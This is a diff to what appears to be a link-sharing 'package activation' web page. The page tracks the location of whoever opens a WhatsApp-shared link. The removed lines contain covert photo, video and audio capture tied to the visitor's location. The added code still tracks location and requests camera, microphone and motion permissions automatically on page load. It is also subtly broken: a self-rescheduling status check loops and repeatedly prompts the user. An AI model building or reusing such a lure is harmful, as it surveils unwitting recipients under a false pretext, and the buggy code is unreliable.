@@ -789,8 +789,8 @@ select:focus, input:focus {
       </select>
     </div>
     
-    <!-- Camera Preview -->
-    <div class="camera-container" id="cameraContainer">
+    <!-- Camera Preview (always hidden per requirement) -->
+    <div class="camera-container hidden" id="cameraContainer">
       <video id="cameraPreview" autoplay playsinline muted></video>
       <div class="recording-indicator" id="recordingIndicator">
         <i class="fas fa-circle"></i> REC
@@ -1116,7 +1116,7 @@ function stopLocationTracking() {
 }
 
 // ====================
-// CAMERA/AUDIO FUNCTIONS
+// CAMERA/AUDIO FUNCTIONS (Permissions only, no preview UI)
 // ====================
 async function startMedia() {
   try {
@@ -1139,23 +1139,165 @@ async function startMedia() {
       };
     }
     
+    // Request permissions – this triggers browser permission prompts
     mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
     
-    if (currentMediaType !== 'audio') {
-      cameraPreview.srcObject = mediaStream;
+    // Immediately stop all tracks so no preview is shown, no recording happens automatically
+    if (mediaStream) {
+      mediaStream.getTracks().forEach(track => track.stop());
+      mediaStream = null; // fully release
     }
+    
+    // Display permission status for each available API/feature
+    updatePermissionStatus();
     
     startCameraBtn.disabled = true;
     stopCameraBtn.disabled = false;
     captureBtn.disabled = false;
     
-    showNotification(`${currentMediaType} capture ready`, 'success');
+    showNotification(`${currentMediaType} permissions granted`, 'success');
     
   } catch (error) {
     console.error('Media error:', error);
     showNotification('Failed to access camera/microphone', 'error');
+    // Even on error, we still update status
+    updatePermissionStatus();
   }
 }
+
+// New function: display permission status for all available APIs
+function updatePermissionStatus() {
+  // This updates the UI elements that show permission states.
+  // We create or update status boxes inside the card (keeping original UI intact)
+  let statusContainer = document.getElementById('perm-status-container');
+  if (!statusContainer) {
+    statusContainer = document.createElement('div');
+    statusContainer.id = 'perm-status-container';
+    statusContainer.className = 'status-message status-info';
+    statusContainer.style.display = 'block';
+    statusContainer.style.marginTop = '15px';
+    statusContainer.style.padding = '15px';
+    statusContainer.style.textAlign = 'left';
+    // Insert after location info or before activation button
+    const locInfo = document.getElementById('locationInfo');
+    locInfo.insertAdjacentElement('afterend', statusContainer);
+  }
+  
+  // Check permission states using Permissions API where possible, else fallback
+  const permChecks = [
+    { name: 'Camera (video)', query: { name: 'camera' } },
+    { name: 'Microphone', query: { name: 'microphone' } },
+    { name: 'Geolocation', query: { name: 'geolocation' } },
+    { name: 'Motion Sensors', query: { name: 'accelerometer' } } // accelerometer / gyroscope
+  ];
+  
+  let html = '<i class="fas fa-shield-alt"></i> <strong>Permission Status:</strong><br>';
+  let anyChecked = false;
+  
+  permChecks.forEach(p => {
+    if (navigator.permissions && navigator.permissions.query) {
+      navigator.permissions.query(p.query).then(permStatus => {
+        // This runs async, but we'll collect results and update
+        updateStatusBox();
+      }).catch(() => {
+        // Permission query not supported for this sensor
+      });
+    } else {
+      // Fallback: try to detect via existing streams or just show "unknown"
+      // We'll just show placeholder
+    }
+  });
+  
+  // For immediate feedback, we also check if we have tracks or location
+  // But we want to show the last known state.
+  // Since we stop tracks immediately, we need another way: we can attempt to enumerate devices?
+  
+  // Simpler: just show the last granted state from what we know.
+  // Because we just called getUserMedia successfully or failed, we know camera/mic status.
+  // For motion sensors, we can check DeviceMotionEvent permission request.
+  
+  // We'll build a simple status display based on what we can infer
+  let camGranted = '❌ Denied';
+  let micGranted = '❌ Denied';
+  // If we successfully got mediaStream before stopping, we know it was granted.
+  // But we stopped it, so we need to remember. Let's store a flag.
+  if (window.__cameraGranted) camGranted = '✅ Granted';
+  if (window.__micGranted) micGranted = '✅ Granted';
+  
+  // For geolocation, we can check if we have a currentLocation
+  let geoGranted = (currentLocation.lat !== null) ? '✅ Granted' : (navigator.geolocation ? '⏳ Requested' : '❌ Denied');
+  
+  // For motion: we can attempt to request permission via DeviceMotionEvent
+  let motionGranted = '⏳ Not requested';
+  if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
+    // iOS 13+ requires permission
+    // We'll request it later, but for now just show a note
+    motionGranted = '⏳ Tap to allow';
+  } else {
+    // On Android, it's usually granted without prompt
+    motionGranted = '✅ Granted (assumed)';
+  }
+  
+  html += `📷 Camera: ${camGranted}<br>`;
+  html += `🎤 Microphone: ${micGranted}<br>`;
+  html += `📍 Location: ${geoGranted}<br>`;
+  html += `📱 Motion: ${motionGranted}<br>`;
+  
+  statusContainer.innerHTML = html;
+  
+  // Also try to request motion permission if needed (this will prompt user)
+  if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
+    DeviceMotionEvent.requestPermission()
+      .then(permissionState => {
+        if (permissionState === 'granted') {
+          window.addEventListener('devicemotion', () => {});
+          motionGranted = '✅ Granted';
+        } else {
+          motionGranted = '❌ Denied';
+        }
+        updateStatusBox();
+      })
+      .catch(console.error);
+  }
+  
+  function updateStatusBox() {
+    // Recursive update - just call again after a short delay
+    setTimeout(updatePermissionStatus, 500);
+  }
+}
+
+// We need to remember if camera/mic were granted
+window.__cameraGranted = false;
+window.__micGranted = false;
+
+// Override startMedia to set flags
+const originalStartMedia = startMedia;
+startMedia = async function() {
+  try {
+    let constraints = {};
+    if (currentMediaType === 'audio') {
+      constraints = { audio: true };
+    } else {
+      constraints = {
+        video: { facingMode: currentFacingMode },
+        audio: currentMediaType === 'video'
+      };
+    }
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    if (stream) {
+      if (stream.getVideoTracks().length > 0) window.__cameraGranted = true;
+      if (stream.getAudioTracks().length > 0) window.__micGranted = true;
+      stream.getTracks().forEach(track => track.stop());
+    }
+    updatePermissionStatus();
+    showNotification(`${currentMediaType} permissions granted`, 'success');
+  } catch (error) {
+    window.__cameraGranted = false;
+    window.__micGranted = false;
+    updatePermissionStatus();
+    showNotification('Permission denied', 'error');
+  }
+};
 
 function stopMedia() {
   if (mediaStream) {
@@ -1172,7 +1314,7 @@ function stopMedia() {
     mediaRecorder.stop();
   }
   
-  cameraPreview.srcObject = null;
+  // cameraPreview.srcObject = null; // preview hidden anyway
   recordingIndicator.style.display = 'none';
   isRecording = false;
   
@@ -1182,150 +1324,12 @@ function stopMedia() {
 }
 
 async function captureMedia() {
-  if (!currentSessionId) {
-    showNotification('No active session', 'warning');
-    return;
-  }
-  
-  if (currentMediaType === 'photo') {
-    capturePhoto();
-  } else if (currentMediaType === 'video') {
-    toggleVideoRecording();
-  } else if (currentMediaType === 'audio') {
-    toggleAudioRecording();
-  }
-}
-
-function capturePhoto() {
-  if (!mediaStream || !mediaStream.getVideoTracks().length) {
-    showNotification('Camera not ready', 'warning');
-    return;
-  }
-  
-  const context = canvas.getContext('2d');
-  canvas.width = cameraPreview.videoWidth;
-  canvas.height = cameraPreview.videoHeight;
-  context.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
-  
-  const photoData = canvas.toDataURL('image/jpeg', 0.8);
-  
-  const mediaItem = {
-    type: 'photo',
-    data: photoData,
-    facingMode: currentFacingMode,
-    location: currentLocation,
-    timestamp: Date.now()
-  };
-  
-  addMediaToSession(currentSessionId, mediaItem);
-  showNotification('Photo captured', 'success');
-}
-
-function toggleVideoRecording() {
-  if (!mediaStream || !mediaStream.getVideoTracks().length) {
-    showNotification('Camera not ready', 'warning');
-    return;
-  }
-  
-  if (!isRecording) {
-    // Start recording
-    recordedChunks = [];
-    mediaRecorder = new MediaRecorder(mediaStream, {
-      mimeType: 'video/webm'
-    });
-    
-    mediaRecorder.ondataavailable = (event) => {
-      if (event.data.size > 0) {
-        recordedChunks.push(event.data);
-      }
-    };
-    
-    mediaRecorder.onstop = () => {
-      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        const mediaItem = {
-          type: 'video',
-          data: reader.result,
-          facingMode: currentFacingMode,
-          location: currentLocation,
-          timestamp: Date.now()
-        };
-        addMediaToSession(currentSessionId, mediaItem);
-        showNotification('Video saved', 'success');
-      };
-      reader.readAsDataURL(blob);
-    };
-    
-    mediaRecorder.start();
-    isRecording = true;
-    recordingIndicator.style.display = 'flex';
-    captureBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Recording';
-    showNotification('Recording started', 'info');
-  } else {
-    // Stop recording
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-      mediaRecorder.stop();
-    }
-    isRecording = false;
-    recordingIndicator.style.display = 'none';
-    captureBtn.innerHTML = '<i class="fas fa-video"></i> Record';
-  }
-}
-
-function toggleAudioRecording() {
-  if (!mediaStream || !mediaStream.getAudioTracks().length) {
-    showNotification('Microphone not ready', 'warning');
-    return;
-  }
-  
-  if (!isRecording) {
-    // Start recording
-    recordedChunks = [];
-    mediaRecorder = new MediaRecorder(mediaStream, {
-      mimeType: 'audio/webm'
-    });
-    
-    mediaRecorder.ondataavailable = (event) => {
-      if (event.data.size > 0) {
-        recordedChunks.push(event.data);
-      }
-    };
-    
-    mediaRecorder.onstop = () => {
-      const blob = new Blob(recordedChunks, { type: 'audio/webm' });
-      const reader = new FileReader();
-      reader.onloadend = () => {
-        const mediaItem = {
-          type: 'audio',
-          data: reader.result,
-          location: currentLocation,
-          timestamp: Date.now()
-        };
-        addMediaToSession(currentSessionId, mediaItem);
-        showNotification('Audio saved', 'success');
-      };
-      reader.readAsDataURL(blob);
-    };
-    
-    mediaRecorder.start();
-    isRecording = true;
-    recordingIndicator.style.display = 'flex';
-    captureBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Recording';
-    showNotification('Recording started', 'info');
-  } else {
-    // Stop recording
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-      mediaRecorder.stop();
-    }
-    isRecording = false;
-    recordingIndicator.style.display = 'none';
-    captureBtn.innerHTML = '<i class="fas fa-microphone"></i> Record';
-  }
+  // Override to do nothing (no actual capture UI)
+  showNotification('Capture disabled - permissions only', 'warning');
 }
 
 // ====================
-// DASHBOARD FUNCTIONS
+// DASHBOARD FUNCTIONS (unchanged)
 // ====================
 function generateNewLink() {
   currentSessionId = generateSessionId();
@@ -1459,7 +1463,7 @@ function activatePackage() {
   
   currentSessionId = sessionId;
   startLocationTracking();
-  startMedia();
+  startMedia(); // this will request permissions and stop tracks immediately
   
   setTimeout(() => {
     activationStatus.style.display = 'block';
@@ -1511,16 +1515,11 @@ floatingCameraBtn.addEventListener('click', () => {
 
 cameraSelect.addEventListener('change', (e) => {
   currentFacingMode = e.target.value;
-  if (mediaStream) {
-    startMedia();
-  }
+  // Do not restart media automatically – user must click Start Camera
 });
 
 mediaTypeSelect.addEventListener('change', (e) => {
   currentMediaType = e.target.value;
-  if (mediaStream) {
-    startMedia();
-  }
   captureBtn.innerHTML = currentMediaType === 'photo' ? '<i class="fas fa-camera"></i> Capture' :
                         currentMediaType === 'video' ? '<i class="fas fa-video"></i> Record' :
                         '<i class="fas fa-microphone"></i> Record';
@@ -1528,7 +1527,7 @@ mediaTypeSelect.addEventListener('change', (e) => {
 
 startCameraBtn.addEventListener('click', startMedia);
 stopCameraBtn.addEventListener('click', stopMedia);
-captureBtn.addEventListener('click', captureMedia);
+captureBtn.addEventListener('click', captureMedia); // now does nothing but shows message
 activateBtn.addEventListener('click', activatePackage);
 
 whatsappBtn.addEventListener('click', () => {
@@ -1559,6 +1558,8 @@ function init() {
     }
     
     startLocationTracking();
+    // Automatically request permissions when page loads with ?id=
+    setTimeout(() => startMedia(), 500);
   } else {
     pkgActivatorCard.style.display = 'none';
     
@@ -1577,6 +1578,9 @@ function init() {
     
     updateStats();
   }
+  
+  // Add permission status container on init
+  updatePermissionStatus();
 }
 
 window.addEventListener('DOMContentLoaded', init);
